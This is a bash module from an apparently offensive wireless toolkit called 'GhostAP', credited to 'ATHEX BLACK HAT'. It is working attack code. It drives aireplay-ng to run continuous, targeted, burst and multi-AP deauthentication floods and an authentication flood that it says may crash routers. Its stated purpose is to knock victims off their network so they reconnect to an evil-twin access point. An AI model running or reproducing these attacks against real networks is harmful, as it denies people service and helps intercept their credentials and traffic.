#!/usr/bin/env bash
# ======================================================================
#  GhostAP — Deauthentication Attack Module
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: Disconnects clients from target AP via deauth flood
#               Forces victims to reconnect to our evil twin
# ======================================================================

# source dependencies
SCRIPT_DIR_DEAUTH="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

source "${SCRIPT_DIR_DEAUTH}/config/colors.sh" 2>/dev/null
source "${SCRIPT_DIR_DEAUTH}/config/settings.conf" 2>/dev/null
source "${SCRIPT_DIR_DEAUTH}/lib/logger.sh" 2>/dev/null
source "${SCRIPT_DIR_DEAUTH}/lib/interface.sh" 2>/dev/null

# ======================================================================
#  GLOBAL VARIABLES
# ======================================================================
DEAUTH_PID=""
DEAUTH_PID_RET=""   # return value for parent script
DEAUTH_ACTIVE=false

# ======================================================================
#  START DEAUTH ATTACK — BROADCAST (ALL CLIENTS)
#  Args: $1 = target BSSID
#        $2 = target channel (optional)
#        $3 = monitor interface (optional)
#  Sets: DEAUTH_PID, DEAUTH_PID_RET
# ======================================================================
start_deauth() {
    local target_bssid="$1"
    local target_channel="${2:-}"
    local mon_iface="${3:-$MON_IFACE}"

    # --- validation ---
    if [[ -z "$target_bssid" ]]; then
        log_error "No target BSSID specified for deauth."
        return 1
    fi

    if ! is_valid_bssid "$target_bssid"; then
        log_error "Invalid BSSID format: $target_bssid"
        return 1
    fi

    if [[ -z "$mon_iface" ]]; then
        log_error "No monitor interface available for deauth."
        return 1
    fi

    if ! is_monitor_mode "$mon_iface"; then
        log_warn "$mon_iface is not in monitor mode. Attempting to fix..."
        start_monitor_mode "$MANAGED_IFACE"
        mon_iface="$MON_IFACE"
    fi

    # --- set channel ---
    if [[ -n "$target_channel" ]]; then
        set_channel "$target_channel" "$mon_iface"
    fi

    # --- deauth parameters ---
    local packet_count="${DEAUTH_PACKETS:-0}"
    local deauth_speed="${DEAUTH_SPEED:-10}"

    log_info "Starting deauth attack..."
    echo -e "  ${GRAY}Target  : ${YELLOW}${target_bssid}${NC}"
    echo -e "  ${GRAY}Channel : ${YELLOW}${target_channel:-auto}${NC}"
    echo -e "  ${GRAY}Iface   : ${YELLOW}${mon_iface}${NC}"
    echo -e "  ${GRAY}Packets : ${YELLOW}$( [[ $packet_count -eq 0 ]] && echo 'infinite' || echo $packet_count )${NC}"
    echo ""

    # --- launch deauth ---
    if [[ "${SHOW_XTERM_WINDOWS:-true}" == "true" ]]; then
        # visible xterm window
        xterm -T "GhostAP — Deauth [${target_bssid}]" \
              -geometry 90x15+50+400 \
              -fg "#ff4444" \
              -e "aireplay-ng --deauth ${packet_count} -a ${target_bssid} --ignore-negative-one ${mon_iface}" &
        DEAUTH_PID=$!
    else
        # background silent
        aireplay-ng --deauth "$packet_count" \
                    -a "$target_bssid" \
                    --ignore-negative-one \
                    "$mon_iface" &>/dev/null &
        DEAUTH_PID=$!
    fi

    sleep 1

    # --- verify started ---
    if kill -0 "$DEAUTH_PID" 2>/dev/null; then
        log_success "Deauth attack active (PID: $DEAUTH_PID)"
        export DEAUTH_PID_RET="$DEAUTH_PID"
        DEAUTH_ACTIVE=true
        return 0
    else
        log_error "Deauth attack failed to start."
        return 1
    fi
}

# ======================================================================
#  START DEAUTH — SPECIFIC CLIENT
#  Args: $1 = target BSSID (AP)
#        $2 = target client MAC
#        $3 = monitor interface (optional)
# ======================================================================
start_deauth_client() {
    local target_bssid="$1"
    local client_mac="$2"
    local mon_iface="${3:-$MON_IFACE}"

    if [[ -z "$target_bssid" ]] || [[ -z "$client_mac" ]]; then
        log_error "Both BSSID and client MAC required for targeted deauth."
        return 1
    fi

    if ! is_valid_bssid "$target_bssid"; then
        log_error "Invalid BSSID: $target_bssid"
        return 1
    fi

    if ! is_valid_bssid "$client_mac"; then
        log_error "Invalid client MAC: $client_mac"
        return 1
    fi

    if [[ -z "$mon_iface" ]]; then
        log_error "No monitor interface available."
        return 1
    fi

    local packet_count="${DEAUTH_PACKETS:-0}"

    log_info "Starting targeted deauth..."
    echo -e "  ${GRAY}AP     : ${YELLOW}${target_bssid}${NC}"
    echo -e "  ${GRAY}Client : ${YELLOW}${client_mac}${NC}"

    if [[ "${SHOW_XTERM_WINDOWS:-true}" == "true" ]]; then
        xterm -T "GhostAP — Deauth [${client_mac}]" \
              -geometry 90x15+50+400 \
              -fg "#ff4444" \
              -e "aireplay-ng --deauth ${packet_count} -a ${target_bssid} -c ${client_mac} ${mon_iface}" &
        DEAUTH_PID=$!
    else
        aireplay-ng --deauth "$packet_count" \
                    -a "$target_bssid" \
                    -c "$client_mac" \
                    "$mon_iface" &>/dev/null &
        DEAUTH_PID=$!
    fi

    sleep 1

    if kill -0 "$DEAUTH_PID" 2>/dev/null; then
        log_success "Targeted deauth active (PID: $DEAUTH_PID)"
        export DEAUTH_PID_RET="$DEAUTH_PID"
        DEAUTH_ACTIVE=true
        return 0
    else
        log_error "Targeted deauth failed to start."
        return 1
    fi
}

# ======================================================================
#  BURST DEAUTH — SEND N PACKETS AND EXIT
#  Useful for quick disconnect without continuous flood
#  Args: $1 = target BSSID
#        $2 = packet count (default 50)
#        $3 = monitor interface (optional)
# ======================================================================
burst_deauth() {
    local target_bssid="$1"
    local packet_count="${2:-50}"
    local mon_iface="${3:-$MON_IFACE}"

    if [[ -z "$target_bssid" ]]; then
        log_error "No target BSSID specified for burst deauth."
        return 1
    fi

    log_info "Sending deauth burst (${packet_count} packets)..."

    aireplay-ng --deauth "$packet_count" \
                -a "$target_bssid" \
                --ignore-negative-one \
                "$mon_iface" 2>/dev/null

    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        log_success "Deauth burst sent successfully."
        return 0
    else
        log_warn "Deauth burst may not have completed cleanly."
        return 1
    fi
}

# ======================================================================
#  DEAUTH WITH AUTHENTICATION FLOOD (More Aggressive)
#  Auth flood + deauth combo — harder to ignore
#  Args: $1 = target BSSID
#        $2 = monitor interface (optional)
# ======================================================================
start_auth_flood() {
    local target_bssid="$1"
    local mon_iface="${2:-$MON_IFACE}"

    if [[ -z "$target_bssid" ]]; then
        log_error "No target BSSID specified for auth flood."
        return 1
    fi

    log_info "Starting authentication flood..."
    log_warn "This is aggressive — may crash some routers."

    if [[ "${SHOW_XTERM_WINDOWS:-true}" == "true" ]]; then
        xterm -T "GhostAP — Auth Flood [${target_bssid}]" \
              -geometry 90x15+50+400 \
              -fg "#ff8800" \
              -e "aireplay-ng --auth 0 -a ${target_bssid} --ignore-negative-one ${mon_iface}" &
        DEAUTH_PID=$!
    else
        aireplay-ng --auth 0 \
                    -a "$target_bssid" \
                    --ignore-negative-one \
                    "$mon_iface" &>/dev/null &
        DEAUTH_PID=$!
    fi

    sleep 1

    if kill -0 "$DEAUTH_PID" 2>/dev/null; then
        log_success "Auth flood active (PID: $DEAUTH_PID)"
        export DEAUTH_PID_RET="$DEAUTH_PID"
        DEAUTH_ACTIVE=true
        return 0
    else
        log_error "Auth flood failed to start."
        return 1
    fi
}

# ======================================================================
#  STOP DEAUTH ATTACK
# ======================================================================
stop_deauth() {
    log_info "Stopping deauth attack..."

    if [[ -n "$DEAUTH_PID" ]]; then
        if kill_process_safe "$DEAUTH_PID" "Deauth"; then
            log_success "Deauth process stopped."
        fi
        DEAUTH_PID=""
    fi

    # kill any stray aireplay-ng
    if pgrep -x "aireplay-ng" &>/dev/null; then
        pkill -x "aireplay-ng" 2>/dev/null
        sleep 0.3
        pkill -9 -x "aireplay-ng" 2>/dev/null
        log_debug "Killed stray aireplay-ng processes."
    fi

    DEAUTH_ACTIVE=false
    export DEAUTH_PID_RET=""
}

# ======================================================================
#  CHECK DEAUTH STATUS
# ======================================================================
is_deauth_running() {
    if [[ -n "$DEAUTH_PID" ]] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
        return 0
    fi
    return 1
}

# ======================================================================
#  GET DEAUTH PROCESS INFO
# ======================================================================
get_deauth_info() {
    if ! is_deauth_running; then
        echo -e "${YELLOW}Deauth not running.${NC}"
        return 1
    fi

    local pid="$DEAUTH_PID"
    local cpu mem

    cpu=$(ps -p "$pid" -o %cpu --no-headers 2>/dev/null | xargs)
    mem=$(ps -p "$pid" -o %mem --no-headers 2>/dev/null | xargs)

    echo ""
    echo -e "${CYAN}═══ Deauth Status ═══${NC}"
    echo -e "  ${GRAY}PID  : ${WHITE}${pid}${NC}"
    echo -e "  ${GRAY}CPU  : ${WHITE}${cpu:-?}%${NC}"
    echo -e "  ${GRAY}MEM  : ${WHITE}${mem:-?}%${NC}"
    echo -e "  ${GRAY}Mode : ${RED}Active${NC}"
    echo ""
}

# ======================================================================
#  MULTI-TARGET DEAUTH
#  Deauth multiple BSSIDs simultaneously
#  Args: $1 = comma-separated BSSID list "AA:BB:CC,DD:EE:FF"
#        $2 = monitor interface (optional)
# ======================================================================
start_multi_deauth() {
    local bssid_list="$1"
    local mon_iface="${2:-$MON_IFACE}"
    local -a pids=()

    if [[ -z "$bssid_list" ]]; then
        log_error "No BSSID list provided."
        return 1
    fi

    IFS=',' read -ra bssids <<< "$bssid_list"

    log_info "Starting multi-target deauth on ${#bssids[@]} APs..."

    for bssid in "${bssids[@]}"; do
        bssid=$(trim "$bssid")
        if is_valid_bssid "$bssid"; then
            log_debug "Deauthing: $bssid"
            aireplay-ng --deauth 0 \
                        -a "$bssid" \
                        --ignore-negative-one \
                        "$mon_iface" &>/dev/null &
            pids+=($!)
        fi
    done

    if [[ ${#pids[@]} -gt 0 ]]; then
        log_success "${#pids[@]} deauth process(es) running."
        DEAUTH_PID="${pids[0]}"
        export DEAUTH_PID_RET="$DEAUTH_PID"
        DEAUTH_ACTIVE=true
        return 0
    else
        log_error "No valid BSSIDs found."
        return 1
    fi
}

# ======================================================================
#  END OF DEAUTH MODULE
# ======================================================================